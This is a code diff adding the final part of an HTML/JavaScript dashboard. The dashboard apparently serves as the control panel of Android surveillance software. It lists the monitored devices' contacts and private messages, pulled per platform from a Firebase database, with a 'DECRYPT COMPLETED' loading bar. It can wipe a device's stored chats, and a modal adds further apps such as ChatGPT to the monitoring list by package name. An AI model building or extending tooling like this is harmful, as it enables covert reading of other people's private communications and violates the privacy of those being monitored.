+      db.ref(`devices/${activeID}/chats/${activePlatform}`).off();
+      db.ref(`devices/${activeID}/chats/${activePlatform}`).on("value", snap => {
+        clearInterval(progressInterval);
+        if (bar) bar.style.width = "100%";
+        if (textVal) textVal.innerText = "DECRYPT COMPLETED! 100%";
+        setTimeout(() => {
+          if (loader) loader.style.display = "none";
+        }, 400);
+
+        container.innerHTML = "";
+        if (!snap.val()) {
+          container.innerHTML = '<div class="loading">No conversations on this platform.</div>';
+          return;
+        }
+        Object.keys(snap.val()).forEach(cKey => {
+          const contact = snap.val()[cKey];
+          const name = contact.name || contact.contactName || cKey;
+          const div = document.createElement("div");
+          div.className = "contact" + (activeContact === cKey ? " active" : "");
+          const avatarHTML = activeTheme === 'ig'
+            ? `<div class="avatar" data-i="${esc(initials(name))}"></div>`
+            : `<div class="avatar">${esc(initials(name))}</div>`;
+          div.innerHTML = `
+          ${avatarHTML}
+          <div class="contact-info">
+            <div class="contact-name">${esc(name)}</div>
+            <div class="contact-sub">Tap to view messages</div>
+          </div>`;
+          div.onclick = () => {
+            activeContact = cKey;
+            activeContactName = name;
+            document.querySelectorAll('.contact').forEach(c => c.classList.remove('active'));
+            div.classList.add('active');
+            openChat(cKey);
+          };
+          container.appendChild(div);
+        });
+      });
+    }
+
+    function openChat(cKey) {
+      const area = document.getElementById('chat-area');
+      const avatarHTML = activeTheme === 'ig'
+        ? `<div class="avatar" data-i="${esc(initials(activeContactName))}"></div>`
+        : `<div class="avatar">${esc(initials(activeContactName))}</div>`;
+      
+      const meta = PLATFORM_META[activeTheme] || { title: "Chats", label: activeTheme, logo: "https://cdn.simpleicons.org/android/ffffff" };
+      area.innerHTML = `
+      <div class="chat-head">
+        ${avatarHTML}
+        <div>
+          <div class="name">${esc(activeContactName)}</div>
+          <div class="presence">${meta.label}</div>
+        </div>
+      </div>
+      <div class="chat-scroll" id="chat-scroll">
+        <div class="loading">Loading messages…</div>
+      </div>`;
+      const scroll = document.getElementById('chat-scroll');
+
+      db.ref(`devices/${activeID}/chats/${activePlatform}/${cKey}/messages`).off();
+      db.ref(`devices/${activeID}/chats/${activePlatform}/${cKey}/messages`).on("value", snap => {
+        scroll.innerHTML = "";
+        if (!snap.val()) {
+          scroll.innerHTML = '<div class="loading">No messages yet.</div>';
+          return;
+        }
+        const msgs = Object.values(snap.val()).sort((a, b) => b.time - a.time);
+        msgs.forEach(m => {
+          const div = document.createElement("div");
+          div.className = `msg ${m.type}`;
+          div.innerHTML = `${esc(m.text || "")}<span class="t">${new Date(m.time).toLocaleString()}</span>`;
+          scroll.appendChild(div);
+        });
+      });
+    }
+
+    function clearPlatformData() {
+      if (!activeID) return alert("Select a device first.");
+      const platformLabel = PLATFORM_META[activeTheme]?.label || activePlatform.split('_').pop().toUpperCase();
+      if (confirm(`Wipe all ${platformLabel} chats for this device?`)) {
+        db.ref(`devices/${activeID}/chats/${activePlatform}`).remove(() => {
+          resetChatArea();
+          loadContacts();
+        });
+      }
+    }
+
+    function openCustomAppModal() {
+      if (!activeID) {
+        alert("Please select a device first.");
+        return;
+      }
+      document.getElementById('customAppModal').style.display = 'flex';
+    }
+
+    function closeCustomAppModal() {
+      document.getElementById('customAppModal').style.display = 'none';
+      document.getElementById('customAppName').value = '';
+      document.getElementById('customAppPackage').value = '';
+    }
+
+    async function addCustomApp() {
+      const name = document.getElementById('customAppName').value.trim();
+      const package = document.getElementById('customAppPackage').value.trim();
+      if (!name || !package) {
+        alert("Please fill in both fields.");
+        return;
+      }
+      try {
+        const resp = await fetch(`/api/device/${activeID}/monitored_apps`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'add', name, package })
+        });
+        const res = await resp.json();
+        if (res.success) {
+          closeCustomAppModal();
+          loadCustomApps();
+          if (window.parent && typeof window.parent.triggerDashboardPoll === 'function') {
+            window.parent.triggerDashboardPoll();
+          }
+        } else {
+          alert(res.error || "Failed to add custom app.");
+        }
+      } catch (e) {
+        alert("Connection error.");
+      }
+    }
+
+    async function deleteCustomApp(package, event) {
+      if (event) event.stopPropagation();
+      if (!confirm(`Are you sure you want to remove monitoring for ${package}?`)) return;
+      try {
+        const resp = await fetch(`/api/device/${activeID}/monitored_apps`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'remove', package })
+        });
+        const res = await resp.json();
+        if (res.success) {
+          loadCustomApps();
+          if (window.parent && typeof window.parent.triggerDashboardPoll === 'function') {
+            window.parent.triggerDashboardPoll();
+          }
+        } else {
+          alert(res.error || "Failed to remove custom app.");
+        }
+      } catch (e) {
+        alert("Connection error.");
+      }
+    }
+
+    async function deleteActiveCustomApp() {
+      let pkg = "";
+      if (customApps && customApps[activePlatform]) {
+        pkg = customApps[activePlatform].package;
+      } else {
+        pkg = activePlatform.replace(/_/g, '.');
+      }
+      
+      if (!pkg) return;
+      if (!confirm(`Are you sure you want to remove monitoring for ${pkg}?`)) return;
+      try {
+        const resp = await fetch(`/api/device/${activeID}/monitored_apps`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'remove', package: pkg })
+        });
+        const res = await resp.json();
+        if (res.success) {
+          if (window.parent && typeof window.parent.triggerDashboardPoll === 'function') {
+            window.parent.triggerDashboardPoll();
+            // Switch parent view back to dashboard since this view is being deleted
+            window.parent.setView('dashboard', window.parent.document.querySelector('[onclick*=dashboard]'));
+          }
+        } else {
+          alert(res.error || "Failed to remove custom app.");
+        }
+      } catch (e) {
+        alert("Connection error.");
+      }
+    }
+  </script>
+
+  <!-- Custom App Modal -->
+  <div id="customAppModal" class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h3>Add Custom App to Monitor</h3>
+        <button class="modal-close" onclick="closeCustomAppModal()">&times;</button>
+      </div>
+      <div class="modal-body">
+        <div class="field-group">
+          <label>App Name</label>
+          <input type="text" id="customAppName" placeholder="e.g. ChatGPT">
+        </div>
+        <div class="field-group">
+          <label>Package Name</label>
+          <input type="text" id="customAppPackage" placeholder="e.g. com.openai.chatgpt">
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn" onclick="closeCustomAppModal()">Cancel</button>
+        <button class="btn btn-primary" onclick="addCustomApp()" style="border-color: rgba(59, 130, 246, 0.4); color: #3b82f6;">Add App</button>
+      </div>
+    </div>
+  </div>
+</body>
+
+</html>
